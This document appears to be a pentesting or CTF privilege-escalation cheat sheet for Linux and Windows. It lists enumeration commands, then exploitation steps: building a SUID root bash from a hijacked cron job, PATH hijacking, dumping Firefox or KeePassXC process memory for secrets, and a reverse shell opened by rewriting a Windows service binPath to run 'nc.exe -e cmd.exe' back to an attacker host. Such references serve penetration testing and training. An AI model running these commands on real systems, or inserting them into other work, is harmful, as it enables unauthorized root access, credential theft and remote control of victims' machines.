# Linux

## Enumeration

`id` List user ID and groups.
Manually enumerate user home directories for interesting files.
`history` or `less .bash_history` etc. Check shell history.
`ls -al /` Look for signs that user is in a docker container.
`findmnt` Find mounts connected to the system.
`mount` Check for docker container or unsafe mounts.
`env` View/modify environment variables.
`echo $PATH` Check the path.
Relative path program exploits.
`sudo -l` List commands user can run as root.
`find / -perm -4000 2>/dev/null` Find SUID binaries.
Check `/etc/apache2` and `/etc/nginx` for `sites-available` files to enumerate.
Check `/var/www` and `/opt` for interesting files.
`git log -p > all-git-commits.txt` Inspect git commits.
Find web server, git, and other config files that may contain credentials.
Check databases for credentials.
Find SSH key files.
`crontab -l` List user crontab.
`cat /etc/crontab` List system crontab.
`ps auxww | grep root` Investigate interesting root processes.
`pspy` Spy on processes to find cron jobs.
Modify vulnerable shell scripts, config files, environment variables, etc.
`ls -al /var/mail` Check user mail.
`docker` Exploit docker containers.
`kubeletctl` Exploit Kubernetes containers.
Run LinPEAS.
`find / -type f -user username 2>/dev/null` Find interesting files owned by username.
`lsattr` Check for vulnerable file attributes.
`getcap -r / 2>/dev/null` Find tools on the system that can do network stuff.
Get OS kernel and release info with `uname -a`, `lsb_release -a`, or `cat /etc/*release`.
## Exploitation

Create SUID Bash (E.g., Leverage hacked cron job or container root access to host filesystem)
```
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod 4755 /tmp/bash
```

Execute SUID Bash
`bash -p`

Path Variable Hijacking (e.g., for cron job binary without absolute path)
`export PATH=/tmp:$PATH`

# Windows

## Enumeration

Net User Groups
`net user username`

Whoami Groups
`whoami /groups`

Enumerate Services (even when sc.exe is denied permission)
`reg query "HKLM\System\CurrentControlSet\Services"`

Get Service Details (sc.exe)
`sc.exe qc servicename`

Get Service Details (registry)
`reg query "HKLM\System\CurrentControlSet\Services\servicename"`

List Processes
`get-process`

Dump Process Memory. E.g., Firefox, KeePassXC
`procdump.exe -ma pid process.dmp`

Extract Strings from Binary Files
`strings -el process.dmp`

## Exploitation

Service Binary Path Revshell
```
Users who are in the "Server Operators" group can modify, start, and stop system services.

Example of revshell via service binary path (e.g., vss service):

sc.exe config servicename binPath="c:\users\username\nc.exe -e cmd.exe ipaddress port"

nc -lvnp port

sc.exe stop servicename
sc.exe start servicename
```
